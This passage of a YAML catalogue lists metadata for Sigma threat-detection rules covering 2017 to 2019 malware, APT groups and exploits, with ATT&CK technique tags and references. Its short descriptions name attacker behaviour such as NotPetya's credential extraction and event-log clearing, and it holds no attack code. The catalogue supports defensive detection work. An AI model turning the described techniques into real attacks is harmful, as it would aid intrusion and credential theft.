  - https://blog.f-secure.com/wp-content/uploads/2019/10/CosmicDuke.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 3d4aebe0-6d29-45b2-a8a4-3dfde586a26d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/Fireball/proc_creation_win_malware_fireball.yml
  name: Fireball Archer Install
  description: Detects Archer malware invocation via rundll32
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.virustotal.com/en/file/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022/analysis/
  - https://www.hybrid-analysis.com/sample/9b4971349ae85aa09c0a69852ed3e626c954954a3927b3d1b6646f139b930022?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: b7967e22-3d7e-409b-9ed5-cdae3f9243a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/Hancitor/proc_access_win_malware_verclsid_shellcode.yml
  name: Malware Shellcode in Verclsid Target Process
  description: Detects a process access to verclsid.exe that injects shellcode from
    a Microsoft Office application / VBA macro
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_access
  data_sources: []
  tactics: []
  techniques:
  - T1055
  tags:
  - attack.defense-evasion
  - attack.privilege-escalation
  - attack.t1055
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/JohnLaTwC/status/837743453039534080
  false_positives:
  - Unknown
  notes: ''
- detection_id: 79aeeb41-8156-4fac-a0cd-076495ab82a1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/NotPetya/proc_creation_win_malware_notpetya.yml
  name: NotPetya Ransomware Activity
  description: Detects NotPetya ransomware activity in which the extracted passwords
    are passed back to the main module via named pipe, the file system journal of
    drive C is deleted and Windows eventlogs are cleared using wevtutil
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.001
  - T1070.001
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - attack.t1070.001
  - attack.credential-access
  - attack.t1003.001
  - car.2016-04-002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/schroedingers-petya/78870/
  - https://www.hybrid-analysis.com/sample/64b0b58a2c030c77fdb2b537b2fcc4af432bc55ffb36599a31d418c7c69e94b1?environmentId=100
  false_positives:
  - Unknown
  notes: ''
- detection_id: aeab5ec5-be14-471a-80e8-e344418305c2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/PlugX/proc_creation_win_malware_plugx_susp_exe_locations.yml
  name: Potential PlugX Activity
  description: Detects the execution of an executable that is typically used by PlugX
    for DLL side loading starting from an uncommon location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.s0013
  - attack.defense-evasion
  - attack.t1574.001
  - detection.emerging-threats
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2016/03/10/beyond-good-ol-run-key-part-36/
  - https://countuponsecurity.com/2017/06/07/threat-hunting-in-the-enterprise-with-appcompatprocessor/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 9e987c6c-4c1e-40d8-bd85-dd26fba8fdd6
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/StoneDrill/win_system_apt_stonedrill.yml
  name: StoneDrill Service Install
  description: This method detects a service install of the malicious Microsoft Network
    Realtime Inspection Service service described in StoneDrill report by Kaspersky
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.g0064
  - attack.t1543.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/blog/research/77725/from-shamoon-to-stonedrill/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 41d40bff-377a-43e2-8e1b-2e543069e079
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/Malware/WannaCry/proc_creation_win_malware_wannacry.yml
  name: WannaCry Ransomware Activity
  description: Detects WannaCry ransomware activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  - Impact
  techniques:
  - T1083
  - T1210
  - T1222.001
  - T1486
  - T1490
  tags:
  - attack.lateral-movement
  - attack.t1210
  - attack.discovery
  - attack.t1083
  - attack.defense-evasion
  - attack.t1222.001
  - attack.impact
  - attack.t1486
  - attack.t1490
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/ed01ebfbc9eb5bbea545af4d01bf5f1071661840480439c6e5babe8e080e41aa?environmentId=100
  - https://x.com/nas_bench/status/1868639048484425963
  false_positives:
  - Unknown
  notes: ''
- detection_id: 966e4016-627f-44f7-8341-f394905c361f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/APT10/proc_creation_win_apt_apt10_cloud_hopper.yml
  name: Potential APT10 Cloud Hopper Activity
  description: Detects potential process and execution activity related to APT10 Cloud
    Hopper operation
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.005
  tags:
  - attack.execution
  - attack.g0045
  - attack.t1059.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20180725233601/https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-annex-b-final.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 18da1007-3f26-470f-875d-f77faf1cab31
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Dragonfly/proc_creation_win_apt_ta17_293a_ps.yml
  name: Ps.exe Renamed SysInternals Tool
  description: Detects renamed SysInternals tool execution with a binary named ps.exe
    as used by Dragonfly APT group and documented in TA17-293A report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.003
  tags:
  - attack.defense-evasion
  - attack.g0035
  - attack.t1036.003
  - car.2013-05-009
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.us-cert.gov/ncas/alerts/TA17-293A
  false_positives:
  - Renamed SysInternals tool
  notes: ''
- detection_id: 881834a4-6659-4773-821e-1c151789d873
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Equation-Group/net_firewall_apt_equationgroup_c2.yml
  name: Equation Group C2 Communication
  description: Detects communication to C2 servers mentioned in the operational notes
    of the ShadowBroker leak of EquationGroup C2 tools
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: high
  status: test
  platform: ''
  product: ''
  category: firewall
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1041
  tags:
  - attack.exfiltration
  - attack.command-and-control
  - attack.g0020
  - attack.t1041
  - detection.emerging-threats
  time_window: ''
  references:
  - https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation
  - https://medium.com/@msuiche/the-nsa-compromised-swift-network-50ec3000b195
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3f7f5b0b-5b16-476c-a85f-ab477f6dd24b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Lazarus/proc_creation_win_apt_lazarus_binary_masquerading.yml
  name: Lazarus System Binary Masquerading
  description: Detects binaries used by the Lazarus group which use system names but
    are executed and launched from non-default location
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1036.005
  tags:
  - attack.defense-evasion
  - attack.t1036.005
  - detection.emerging-threats
  time_window: ''
  references:
  - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180244/Lazarus_Under_The_Hood_PDF_final.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 47e0852a-cf81-4494-a8e6-31864f8c86ed
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Pandemic/registry_event_apt_pandemic.yml
  name: Pandemic Registry Key
  description: Detects Pandemic Windows Implant
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  - detection.emerging-threats
  time_window: ''
  references:
  - https://wikileaks.org/vault7/#Pandemic
  - https://twitter.com/MalwareJake/status/870349480356454401
  false_positives:
  - Unknown
  notes: ''
- detection_id: 739915e4-1e70-4778-8b8a-17db02f66db1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Turla/pipe_created_apt_turla_named_pipes.yml
  name: Turla Group Named Pipes
  description: Detects a named pipe used by Turla group samples
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: pipe_created
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1106
  tags:
  - attack.g0010
  - attack.execution
  - attack.t1106
  - detection.emerging-threats
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1df8b3da-b0ac-4d8a-b7c7-6cb7c24160e4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Turla/win_system_apt_carbonpaper_turla.yml
  name: Turla Service Install
  description: This method detects a service install of malicious services mentioned
    in Carbon Paper - Turla report by ESET
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.g0010
  - attack.t1543.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1228f8e2-7e79-4dea-b0ad-c91f1d5016c1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2017/TA/Turla/win_system_apt_turla_service_png.yml
  name: Turla PNG Dropper Service
  description: This method detects malicious services mentioned in Turla PNG dropper
    report by NCC Group in November 2018
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.g0010
  - attack.t1543.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://research.nccgroup.com/2018/11/22/turla-png-dropper-is-back/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: a2e97350-4285-43f2-a63f-d0daff291738
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/Exploits/CVE-2018-13379/web_cve_2018_13379_fortinet_preauth_read_exploit.yml
  name: Fortinet CVE-2018-13379 Exploitation
  description: Detects CVE-2018-13379 exploitation attempt against Fortinet SSL VPNs
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics: []
  techniques:
  - T1190
  tags:
  - attack.initial-access
  - attack.t1190
  - cve.2018-13379
  - detection.emerging-threats
  time_window: ''
  references:
  - https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4c9d903d-4939-4094-ade0-3cb748f4d7da
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/Exploits/CVE-2018-15473/lnx_sshd_exploit_cve_2018_15473.yml
  name: SSHD Error Message CVE-2018-15473
  description: Detects exploitation attempt using public exploit code for CVE-2018-15473
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: medium
  status: test
  platform: linux
  product: sshd
  category: ''
  data_sources: []
  tactics:
  - Reconnaissance
  techniques:
  - T1589
  tags:
  - attack.reconnaissance
  - attack.t1589
  - cve.2018-15473
  - detection.emerging-threats
  time_window: ''
  references:
  - https://github.com/Rhynorater/CVE-2018-15473-Exploit
  false_positives:
  - Unknown
  notes: ''
- detection_id: 37e8369b-43bb-4bf8-83b6-6dd43bda2000
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/Exploits/CVE-2018-2894/web_cve_2018_2894_weblogic_exploit.yml
  name: Oracle WebLogic Exploit
  description: Detects access to a webshell dropped into a keystore folder on the
    WebLogic server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 0
  predictive_readiness_factors: []
  severity: critical
  status: test
  platform: ''
  product: ''
  category: webserver
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1190
  - T1505.003
  tags:
  - attack.t1190
  - attack.initial-access
  - attack.persistence
  - attack.t1505.003
  - cve.2018-2894
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/pyn3rd/status/1020620932967223296
  - https://github.com/LandGrey/CVE-2018-2894
  false_positives:
  - Unknown
  notes: ''
- detection_id: e507feb7-5f73-4ef6-a970-91bb6f6d744f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/Malware/Elise-Backdoor/proc_creation_win_malware_elise.yml
  name: Elise Backdoor Activity
  description: Detects Elise backdoor activity used by APT32
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.g0030
  - attack.g0050
  - attack.s0081
  - attack.execution
  - attack.t1059.003
  - detection.emerging-threats
  time_window: ''
  references:
  - https://community.rsa.com/community/products/netwitness/blog/2018/02/13/lotus-blossom-continues-asean-targeting
  - https://web.archive.org/web/20200302083912/https://www.accenture.com/t20180127T003755Z_w_/us-en/_acnmedia/PDF-46/Accenture-Security-Dragonfish-Threat-Analysis.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 9aa01d62-7667-4d3b-acb8-8cb5103e2014
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/APT27/proc_creation_win_apt_apt27_emissary_panda.yml
  name: APT27 - Emissary Panda Activity
  description: Detects the execution of DLL side-loading malware used by threat group
    Emissary Panda aka APT27
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1574.001
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.defense-evasion
  - attack.t1574.001
  - attack.g0027
  - detection.emerging-threats
  time_window: ''
  references:
  - https://app.any.run/tasks/579e7587-f09d-4aae-8b07-472833262965
  - https://twitter.com/cyb3rops/status/1168863899531132929
  - https://research.nccgroup.com/2018/05/18/emissary-panda-a-potential-new-malicious-tool/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ba778144-5e3d-40cf-8af9-e28fb1df1e20
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/APT28/proc_creation_win_apt_sofacy.yml
  name: Sofacy Trojan Loader Activity
  description: Detects Trojan loader activity as used by APT28
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.g0007
  - attack.t1059.003
  - attack.t1218.011
  - car.2013-10-002
  - detection.emerging-threats
  time_window: ''
  references:
  - https://researchcenter.paloaltonetworks.com/2018/02/unit42-sofacy-attacks-multiple-government-entities/
  - https://www.hybrid-analysis.com/sample/ff808d0a12676bfac88fd26f955154f8884f2bb7c534b9936510fd6296c543e8?environmentId=110
  - https://twitter.com/ClearskySec/status/960924755355369472
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3a3f81ca-652c-482b-adeb-b1c804727f74
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/APT29-CozyBear/file_event_win_apt_cozy_bear_phishing_campaign_indicators.yml
  name: APT29 2018 Phishing Campaign File Indicators
  description: Detects indicators of APT 29 (Cozy Bear) phishing-campaign as reported
    by mandiant
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: file_event
  data_sources: []
  tactics: []
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/DrunkBinary/status/1063075530180886529
  - https://www.mandiant.com/resources/blog/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7453575c-a747-40b9-839b-125a0aae324b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/APT29-CozyBear/proc_creation_win_apt_apt29_phishing_campaign_indicators.yml
  name: APT29 2018 Phishing Campaign CommandLine Indicators
  description: Detects indicators of APT 29 (Cozy Bear) phishing-campaign as reported
    by mandiant
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.011
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.011
  - detection.emerging-threats
  time_window: ''
  references:
  - https://twitter.com/DrunkBinary/status/1063075530180886529
  - https://www.microsoft.com/security/blog/2018/12/03/analysis-of-cyberattack-on-u-s-think-tanks-non-profits-public-sector-by-unidentified-attackers/
  - https://www.mandiant.com/resources/blog/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 4ac5fc44-a601-4c06-955b-309df8c4e9d4
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/APT32-Oceanlotus/registry_event_apt_oceanlotus_registry.yml
  name: OceanLotus Registry Activity
  description: Detects registry keys created in OceanLotus (also known as APT32) attacks
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1112
  tags:
  - attack.persistence
  - attack.defense-evasion
  - attack.t1112
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.welivesecurity.com/2019/03/20/fake-or-fake-keeping-up-with-oceanlotus-decoys/
  - https://github.com/eset/malware-ioc/tree/master/oceanlotus
  false_positives:
  - Unknown
  notes: ''
- detection_id: 36222790-0d43-4fe8-86e4-674b27809543
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/MuddyWater/proc_creation_win_apt_muddywater_activity.yml
  name: Potential MuddyWater APT Activity
  description: Detects potential Muddywater APT activity
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques: []
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.g0069
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.mandiant.com/resources/blog/iranian-threat-group-updates-ttps-in-spear-phishing-campaign
  false_positives:
  - Unlikely
  notes: ''
- detection_id: ce6e34ca-966d-41c9-8d93-5b06c8b97a06
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/OilRig/proc_creation_win_apt_oilrig_mar18.yml
  name: OilRig APT Activity
  description: Detects OilRig activity as reported by Nyotron in their March 2018
    report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1071.004
  - T1112
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.g0049
  - attack.t1053.005
  - attack.s0111
  - attack.t1543.003
  - attack.defense-evasion
  - attack.t1112
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20180402134442/https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018C.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7bdf2a7c-3acc-4091-9581-0a77dad1c5b5
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/OilRig/registry_event_apt_oilrig_mar18.yml
  name: OilRig APT Registry Persistence
  description: Detects OilRig registry persistence as reported by Nyotron in their
    March 2018 report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: registry_event
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1071.004
  - T1112
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.g0049
  - attack.t1053.005
  - attack.s0111
  - attack.t1543.003
  - attack.defense-evasion
  - attack.t1112
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20180402134442/https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018C.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: c0580559-a6bd-4ef6-b9b7-83703d98b561
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/OilRig/win_security_apt_oilrig_mar18.yml
  name: OilRig APT Schedule Task Persistence - Security
  description: Detects OilRig schedule task persistence as reported by Nyotron in
    their March 2018 report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1071.004
  - T1112
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.g0049
  - attack.t1053.005
  - attack.s0111
  - attack.t1543.003
  - attack.defense-evasion
  - attack.t1112
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20180402134442/https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018C.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 53ba33fd-3a50-4468-a5ef-c583635cfa92
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/OilRig/win_system_apt_oilrig_mar18.yml
  name: OilRig APT Schedule Task Persistence - System
  description: Detects OilRig schedule task persistence as reported by Nyotron in
    their March 2018 report
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: system
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  - T1071.004
  - T1112
  - T1543.003
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.g0049
  - attack.t1053.005
  - attack.s0111
  - attack.t1543.003
  - attack.defense-evasion
  - attack.t1112
  - attack.command-and-control
  - attack.t1071.004
  - detection.emerging-threats
  time_window: ''
  references:
  - https://web.archive.org/web/20180402134442/https://nyotron.com/wp-content/uploads/2018/03/Nyotron-OilRig-Malware-Report-March-2018C.pdf
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 958d81aa-8566-4cea-a565-59ccd4df27b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/Slingshot/proc_creation_win_apt_slingshot.yml
  name: Defrag Deactivation
  description: Detects the deactivation and disabling of the Scheduled defragmentation
    task as seen by Slingshot APT group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053.005
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053.005
  - attack.s0111
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/apt-slingshot/84312/
  false_positives:
  - Unknown
  notes: ''
- detection_id: c5a178bf-9cfb-4340-b584-e4df39b6a3e7
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/Slingshot/win_security_apt_slingshot.yml
  name: Defrag Deactivation - Security
  description: Detects the deactivation and disabling of the Scheduled defragmentation
    task as seen by Slingshot APT group
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: security
  category: ''
  data_sources: []
  tactics:
  - Execution
  - Persistence
  techniques:
  - T1053
  tags:
  - attack.privilege-escalation
  - attack.execution
  - attack.persistence
  - attack.t1053
  - attack.s0111
  - detection.emerging-threats
  time_window: ''
  references:
  - https://securelist.com/apt-slingshot/84312/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8c7090c3-e0a0-4944-bd08-08c3a0cecf79
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2018/TA/TropicTrooper/proc_creation_win_apt_tropictrooper.yml
  name: TropicTrooper Campaign November 2018
  description: Detects TropicTrooper activity, an actor who targeted high-profile
    organizations in the energy and food and beverage sectors in Asia
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  - detection.emerging-threats
  time_window: ''
  references:
  - https://www.microsoft.com/en-us/security/blog/2018/11/28/windows-defender-atp-device-risk-score-exposes-new-cyberattack-drives-conditional-access-to-protect-networks/
  false_positives: []
  notes: ''
- detection_id: 931b6802-d6a6-4267-9ffa-526f57f22aaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules-emerging-threats/2019/Exploits/BearLPE-Exploit/proc_creation_win_exploit_other_bearlpe.yml
  name: Potential BearLPE Exploitation
  description: Detects potential exploitation of the BearLPE exploit using Task Scheduler
    ".job" import arbitrary DACL write\par
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
